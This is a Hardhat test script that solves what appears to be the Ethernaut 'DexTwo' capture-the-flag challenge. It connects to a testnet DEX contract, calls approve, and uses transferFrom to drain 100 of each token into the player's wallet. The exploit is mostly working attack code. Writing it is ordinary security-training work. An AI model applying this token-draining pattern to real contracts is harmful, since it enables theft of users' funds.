import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { expect } from "chai";

describe("dextwo", function() {
    it("should solve dextwo challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);


        /*
         * The challenge says:
         * You will start with 10 tokens of token1 and 10 of token2. 
         * The DexTwo contract starts with 100 of each token.
         */

        // deploy both tokens with an initial supply of 110
        // for localnet
        /*
        const swappableFactory = await ethers.getContractFactory("SwappableTokenTwo");
        const token1 = await swappableFactory.deploy("token1", "tk1", 110);
        const token2 = await swappableFactory.deploy("token2", "tk2", 110);
        await eoa.provider!.waitForTransaction(token1.deployTransaction.hash);
        await eoa.provider!.waitForTransaction(token2.deployTransaction.hash);

        // deploy dex factory with token1 and token2 address. 
        const dexFactory = await ethers.getContractFactory("DexTwo");
        const dex = await dexFactory.deploy(token1.address, token2.address);
        await eoa.provider!.waitForTransaction(dex.deployTransaction.hash);
        
        // Check initial balances
        balance = await dex.balanceOf(token1.address, eoa.address);
        console.log("Owner token1: " + balance);
        expect(balance).to.eq(110);

        balance = await dex.balanceOf(token2.address, eoa.address);
        console.log("Owner token2: " + balance);
        expect(balance).to.eq(110);

        // distribute tokens as challenge suggested
        let tx = await token1.transfer(dex.address, 100);
        await tx.wait();
        console.log(tx);

        tx = await token2.transfer(dex.address, 100);
        await tx.wait();
        console.log(tx);

        const attackerEoa = accounts[1];
        tx = await token1.transfer(attackerEoa.address, 10);
        await tx.wait();
        console.log(tx);

        tx = await token2.transfer(attackerEoa.address, 10);
        await tx.wait();
        console.log(tx);

        // check balances after distribution
        balance = await dex.balanceOf(token1.address, dex.address);
        console.log("Dex token1: " + balance);
        expect(balance).to.eq(100);

        balance = await dex.balanceOf(token2.address, dex.address);
        console.log("Dex token2: " + balance);
        expect(balance).to.eq(100);

        balance = await dex.balanceOf(token1.address, attackerEoa.address);
        console.log("Attacker token1: " + balance);
        expect(balance).to.eq(10);

        balance = await dex.balanceOf(token2.address, attackerEoa.address);
        console.log("Attacker token2: " + balance);
        expect(balance).to.eq(10);
        */
        
        // attack starts here
        // choose eoa (attacker or eao from provided priv key) depending on localnet or rinkeby testnet

        /*
        let dexCont = dex.connect(attackerEoa)
        tx = await dex.approve(attackerEoa.address, 100);
        await tx.wait();

        tx = await token1.connect(attackerEoa).transferFrom(dex.address, attackerEoa.address, 100);
        await tx.wait();
        expect(await token1.balanceOf(attackerEoa.address)).to.be.eq(110);

        tx = await token2.connect(attackerEoa).transferFrom(dex.address, attackerEoa.address, 100);
        await tx.wait();
        expect(await token2.balanceOf(attackerEoa.address)).to.be.eq(110);
        */

        // for rinkeby
        const dexABI = [
            "function token1() public view returns (address)",
            "function token2() public view returns (address)",
            "function approve(address spender, uint amount) public returns(bool)",
        ];
        const tokenABI = [
            "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
            "function balanceOf(address) public view returns (uint)",
        ];

        let dexAddr = "0x498eEb8010258e420eEf07ffc3904bc34785D108";
        let dexCont = (new ethers.Contract(dexAddr, dexABI, ethers.getDefaultProvider())).connect(eoa);
        
        let token1Addr = dexCont.token1();
        let token2Addr = dexCont.token2();

        let token1 = (new ethers.Contract(token1Addr, tokenABI, ethers.getDefaultProvider())).connect(eoa);
        let token2 = (new ethers.Contract(token2Addr, tokenABI, ethers.getDefaultProvider())).connect(eoa);
        
        // approve contract's tokens for attacker
        let tx = await dexCont.approve(eoa.address, 100);
        await tx.wait();

        // transfer 100 token1
        tx = await token1.transferFrom(dexCont.address, eoa.address, 100);
        await tx.wait();
        expect(await token1.balanceOf(eoa.address)).to.be.eq(110);

        // transfer 100 token2
        tx = await token2.transferFrom(dexCont.address, eoa.address, 100);
        await tx.wait();
        expect(await token2.balanceOf(eoa.address)).to.be.eq(110);
   });
});
